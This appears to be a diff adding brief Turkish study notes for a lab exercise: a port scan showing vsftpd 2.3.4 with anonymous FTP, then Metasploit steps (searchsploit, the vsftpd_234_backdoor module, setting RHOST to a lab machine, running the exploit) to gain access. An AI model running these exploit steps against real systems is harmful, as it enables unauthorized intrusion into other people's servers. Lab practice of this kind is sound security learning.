@@ -1,0 +1,19 @@
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+Zenmap'ten aldığımız açığı nasıl sömürebiliriz.
+
+msfconsole _> terminale yazıyoruz. bize hacking tool'u açacak(metasploit)
+
+açığın versiyonunu alıyoruz -> vsftpd 2.3.4
+
+searchsploit aracı ile buna uygun exploit bulabiliriz:
+searchsploit vsftpd 2.3.4
+
+
+msfconsole'a geri dönüyoruz.
+use exploit/unix/ftp/vsftpd_234_backdoor -> bu exploiti kullan dedik ve exploit içine girdik
+show options -> bize ilgili exploit'in ayarlarını gösterir.
+RHOST ve RPORT görüyoruz port 21 fakat host kısmı boş bunu değiştirmemiz lazım;
+set RHOST 10.0.2.7 -> RHOST'u ayarladık hedef metasploit makinamızın ipsine göre
+exploit -> bağlantıyı sağlıyoruz.
